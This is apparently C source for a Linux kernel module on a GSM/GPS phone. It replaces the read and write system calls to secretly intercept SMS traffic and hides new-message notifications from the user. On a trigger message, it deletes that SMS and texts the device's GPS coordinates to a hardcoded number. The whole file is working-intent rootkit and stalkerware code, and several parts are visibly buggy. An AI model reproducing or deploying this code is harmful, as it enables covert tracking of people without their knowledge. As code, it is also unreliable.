#include <linux/module.h>	/* Needed by all modules */
#include <linux/kernel.h>	/* Needed for KERN_INFO */
#include <linux/syscalls.h>
#include <linux/unistd.h>
#include <linux/linkage.h>
#include <linux/types.h>
#include <linux/compiler.h>
#include <linux/fcntl.h>
#include <linux/fs.h>
#include <linux/file.h>
#include <asm/uaccess.h>
#include <linux/delay.h>
#include <linux/tty.h>
#include <linux/tty_driver.h>

MODULE_LICENSE("GPL");


int once = 0;
int once2= 0;
char ind1 = NULL;
char ind2 = NULL;
int simindexlength;
int cmgroccur=0;
int cmtioccurred=0;
int notours=0;
int after =0;
char *simindex;
int message = 0;
struct list_head *tty_drivers_list;
struct tty_struct *gsm;
struct syscall_handler_t **sys_call_table;
asmlinkage ssize_t (*old_sys_write)(unsigned int fd, const char __user *buf, size_t count);
asmlinkage ssize_t (*old_sys_read)(unsigned int fd, char __user *buf, size_t count);
asmlinkage long (*old_sys_open)(const char __user *filename, int flags, int mode);
asmlinkage long (*old_sys_ioctl)(unsigned int fd, unsigned int cmd, unsigned long arg);
asmlinkage long (*old_sys_fcntl64)(unsigned int fd, unsigned int cmd, unsigned long arg);
asmlinkage long (*old_sys_close)(unsigned int fd);

void copyval(char* msg, char* parseMsg, int loc, int* done){
		 
	parseMsg[0] = msg[loc];
	parseMsg[1] = msg[loc+1];
	char checkval = msg[loc+2];
	if(checkval=='"'){
		//printf("end reached\n");
		*done = 1;
	}
}

/* This function decodes a message starting at a specified index */
char* smsdecode(char *msg, int index) {
  	unsigned char *buf, *out;
	
	//allocate storage
	buf = kmalloc(200,GFP_KERNEL);	
	out = kmalloc(200,GFP_KERNEL);
	int i, location = index-1+16;
 
	if(!buf || !out){
    		return NULL;
  	}
	

	int count = i;
	char* msgStore = kmalloc(sizeof(char)*2,GFP_KERNEL);
	
	//loop over the argv's which are of type *char and store them as int hex's in buff,l done via strtoul.
	//*****strtoul may not work in kernel space... need to check!
	//*****simple_strtoul in kernel space
	int *done = 0;
	i = 1;
	
	while((int)done != 1){	
		copyval(msg,msgStore,location,&done);
		//printf("msgStore=%s\n",msgStore);		
		buf[i-1] = simple_strtoul(msgStore, NULL, 16);

		printk(KERN_INFO "WHILE LOOP: %s\n",msgStore);
		//printf("buf=%d\n",buf[i-1]);
		location = location + 2;
		i++;	
	}

	//assign the length hex value, this way we know when to stop!
	int len = buf[0];//there was an extra ; here
	unsigned char *inp = buf + 1;
	
 	for(i = 0; i <= len; i ++){
 		int ipos = i - i / 8;    
		int offset = i % 8;
		out[i] = (inp[ipos] & (0x7F >> offset)) << offset;
    		
		if(offset)
		      out[i] |= (inp[ipos - 1] & (0x7F << (8 - offset)) & 0xFF) >> (8 - offset);
  	}

  	out[len] = 0;
  	//printf("%s\n", out);

  	kfree(buf);
	kfree(msgStore);
  	return out;
}

/* The copynum() function is used to insert values of numbers.            *
 * Copying memory addresses did not work.  We need to insert values       *
 * into the buffer directly without manipulating kernel memory addresses  */
void copynum(int index1, int index2, char *newbuf, char *oldbuf)
{ 
	if(oldbuf[index2] == '1')
	      newbuf[index1] = '1';
	if(oldbuf[index2] == '2')
	      newbuf[index1] = '2';
	if(oldbuf[index2] == '3')
	      newbuf[index1] = '3';
	if(oldbuf[index2] == '4')
	      newbuf[index1] = '4';
	if(oldbuf[index2] == '5')
	      newbuf[index1] = '5';
	if(oldbuf[index2] == '6')
	      newbuf[index1] = '6';
	if(oldbuf[index2] == '7')
	      newbuf[index1] = '7';
	if(oldbuf[index2] == '8')
	      newbuf[index1] = '8';
	if(oldbuf[index2] == '9')
	      newbuf[index1] = '9';
	if(oldbuf[index2] == '0')
	      newbuf[index1] = '0';
}

/* sendLocation turns on the GPS device and reads the GPS coordinates from it.  *
 * Once we have the GPS coordinates we send them by SMS.                        */ 
void sendLocation(){
	char gpson = '1';
	int gpsfd,gsmfd;            // file descriptors for gsm and gps
	char *loc,*bufloc;          // buffers that will store the GSP location and whole read_buf
	struct list_head *pos;
	struct tty_driver *tmp;
	struct tty_struct **ttydevs;
	struct tty_struct *gps;

	mm_segment_t old_fs = get_fs();
	set_fs(KERNEL_DS);

	/* turn on and open GPS */
	gpsfd = old_sys_open("/sys/bus/platform/drivers/neo1973-pm-gps/neo1973-pm-gps.0/pwron", O_WRONLY,0);
	old_sys_write(gpsfd,&gpson,1);
	old_sys_close(gpsfd);

	gpsfd = old_sys_open("/dev/ttySAC1",2050,0);

	/* loop through the list again so we can find the gps tty_struct */
	list_for_each(pos, tty_drivers_list){
	      tmp = list_entry(pos, struct tty_driver, tty_drivers);
	     
	      if(strstr(tmp->driver_name,"ttySAC"))
		    break;
	}
	
	ttydevs = tmp->ttys;
	gps = ttydevs[1];
	
	if(gps != NULL){	
		ssleep(3); // wait for some data arrives in the gps buffer

		loc = kmalloc(43,GFP_KERNEL);  // will store the location
		bufloc = strstr(gps->read_buf,"$GPGGA"); //stores whole read_buf from $GPGGA on

		strncpy(loc,bufloc,43); // copy 43 bytes of bufloc into loc
	}
	
	/* open gsm device and send sms with location */
	gsmfd = old_sys_open("/dev/ttySAC0",2050,0);
	old_sys_write(gsmfd,"AT+CMGS=\"7324067545\"\r",21);

	/* need function to wait correctly for prompt */
	old_sys_write(gsmfd,loc,43);
	old_sys_write(gsmfd,"\r\032",2);
	old_sys_close(gsmfd);
	
	set_fs(old_fs);
}

/* Our new read system call monitors file descriptor 12.  This is the file descriptor      *
 * Qtopia opens the gsm device at.  We check the read_buf whenever a read system call is   *
 * made so that we stay ahead of Qtopia.  We check for +CMTI notificatins to get the       *
 * index of the incoming message.                                                          */
asmlinkage ssize_t new_sys_read(unsigned int fd, char __user *buf, size_t count){

      ssize_t read;
      int i;
      char *cmti;
      int length;
      int gsmfd;
      char *readcommand;
      read = old_sys_read(fd,buf,count);

      if(fd == 12){
      
	    cmti = strstr(gsm->read_buf,"+CMTI");
	    if(cmti != NULL){
		
		/* we only want do this once */
		if(once == 0){
			
			ind1 = cmti[12];  // save the first index
			
			/* check if the next character is a number, if it is save it */
			if(cmti[13] >= '0' && cmti[13] <= '9')
			      ind2 = cmti[13];
			      
			/* check if we have a 2 character index or not */
			/* copy the sim index number into a new string */
			if(ind2!=NULL){
			      length = 15;
			      simindexlength = 2;
			      simindex = kmalloc(simindexlength, GFP_KERNEL);
			      simindex[0] = ind1;
			      simindex[1] = ind2;
			}
			else{
			      printk(KERN_INFO "INDEX %c",ind1);
			      length = 14;
			      simindexlength =1;
			      simindex = kmalloc(simindexlength, GFP_KERNEL);
			      simindex[0] = ind1;
			}  

			mm_segment_t old_fs = get_fs();
			set_fs(KERNEL_DS);
			
			/* list messages */
			old_sys_write(fd,"AT+CMGL=4\r",10);

			set_fs(old_fs);
			
			cmtioccurred = 1; // boolean so we know we need to handle a new message
		   }

		    once = 1;
	    }
      }
   
      return read;
}

/* our new write system call monitors the +CMTI command as well.  We do not        *
 * let any of these notifications pass just returning the count and not sending it *
 * to old_sys_write.  We also handle reading the message and decoding it.          */
asmlinkage ssize_t new_sys_write(unsigned int fd, const char __user *buf, size_t count)
{    
	char __user *newbuf = buf;
	char *cmgr;
	char *smsmessage;
	int gsmfd;

	/* block CMTI and CUSD which both occur when a new message arrives */
	if(strstr(buf,"+CMTI") != NULL || strstr(buf,"+CUSD") != NULL)
		return count;
	
	/* check that a message has been found and it is the write call              *
         * exactly after the message has been found.  CMGL responses are multilined  *
         * and the message is in the 2nd write buffer.                               */
	if(after == 1 && message == 1)
	{
		char *smsmessage;
		char *deletecommand;
		char *deletecommandb;
		size_t size;
		size_t sizeb;
		int fd;

		/* decode the buffer starting at index 52, where the message starts */
		smsmessage = smsdecode(buf,52);

		if(strstr(smsmessage,"gps sms location") == NULL){
			int gsmfd;
			
			notours = 1;         // it is not ours
			
			/* send a new CMGL command so we can make the message unread */
			mm_segment_t old_fs = get_fs();
			set_fs(KERNEL_DS);
			gsmfd = old_sys_open("/dev/ttySAC0" , 2050,0);
			old_sys_write(fd,"AT+CMGL=4\r",10);
			old_sys_close(gsmfd);
			set_fs(old_fs);
		}
		else{
			/* it is our message so we must delete it */
			if(simindexlength == 2){
				deletecommand = kmalloc(10,GFP_KERNEL);
				deletecommand = "AT+CMGD=##\r";
				deletecommand[8] = ind1;
				deletecommand[9] = ind2;
				
			}
			else{
				deletecommand = kmalloc(19,GFP_KERNEL);
				deletecommand = "AT+CMGD=#\r";
				deletecommand[8] = ind1;
			}
			
			/* send delete command to GSM */
			mm_segment_t old_fs = get_fs();
			set_fs(KERNEL_DS);
			gsmfd = old_sys_open("/dev/ttySAC0" , 2050,0);
			old_sys_write(fd,deletecommand,sizeof(deletecommand)/sizeof(char));
			old_sys_close(gsmfd);
			
			set_fs(old_fs);
			
			sendLocation();  // function that gets gps location and sends it via sms
			
			/* set all our variables back to their initial state */
			cmtioccurred = 0;
			notours = 0;
			after = 0;
			simindexlength = 0;
			kfree(simindex);
			once = 0;
		}		
	}

	
	/* check for CMGL and for if a new message has arrived or if the message is not ours.   *
         * If it is not ours we must list the messages again and change the message to unread.  */
	if(buf[16] == 'C' && buf[17] == 'M' && buf[18] == 'G'&& buf[19] == 'L' && (cmtioccurred == 1 || notours == 1))
	{
		int cpysimindexlength;
		int j;
		int i = 22;
		after = 1;
		
		/* create a copy of the simindexlength */
		for(j=0; j<100;j++)
		{
			if(j == simindexlength)
				cpysimindexlength = j;
		}

		/* check if the index of the CMGL command is the same as the index from the CMTI notification */
		while(cpysimindexlength != 0)
		{
			if(buf[i] == simindex[i-22])
				message = 1;
			else
				message = 0;
			
			i++;
			cpysimindexlength--;
		}
		
		/* if the message is ours, mark it as read */
		if(message == 1 && notours == 0){
			if(simindexlength == 2)
			newbuf[25] = '1';
			if(simindexlength == 1)
			newbuf[24] == '1';
		}
		
		/* if the message is not ours, mark it as unread */
		if(message == 1 && notours == 1){
			if(simindexlength == 2)
			newbuf[25] = '0';
			if(simindexlength == 1)
			newbuf[24] == '0';
			
			/* reinitialize variables */
			cmtioccurred = 0;
			notours = 0;
			after = 0;
			simindexlength = 0;
			kfree(simindex);
			once = 0;
		}  
	}
	      
	return old_sys_write(fd, buf, count);   
}

int init_module(void)
{

	struct list_head *pos;
	struct tty_driver *tmp;
	struct tty_struct **ttydevs;
	char *readcommand;
	int fd;
	/* define the sys_call_table.  Memory address is given from System.map */
	sys_call_table = (struct syscall_handler_t *)0xc00290e8;  
	tty_drivers_list =  (struct list_head *)0xc03b03a0;

	old_sys_open = sys_call_table[__NR_open];    // keep original pointer to sys_open
	old_sys_write = sys_call_table[__NR_write];  // keep original pointer to sys_write
	old_sys_read = sys_call_table[__NR_read];    // keep original pointer to sys_read
	old_sys_close = sys_call_table[__NR_close];  // keep original pointer to sys_close

	sys_call_table[__NR_write] = new_sys_write;
	sys_call_table[__NR_read] = new_sys_read;
	
	
	/* loop through tty_drivers to find struct for ttySAC */
        /* create a pointer to the tty_struct corresponding to gsm  */
	list_for_each(pos, tty_drivers_list){
	      tmp = list_entry(pos, struct tty_driver, tty_drivers);
	      
	      if(strstr(tmp->driver_name,"ttySAC"))
		    break;
	}
	  
	 ttydevs = tmp->ttys;
	 gsm = ttydevs[0];      
	
	/* 
	 * A non 0 return means init_module failed; module can't be loaded. 
	 */
	return 0;
}

void cleanup_module(void)
{
      sys_call_table[__NR_write] = old_sys_write;
      sys_call_table[__NR_read] = old_sys_read;

}	
 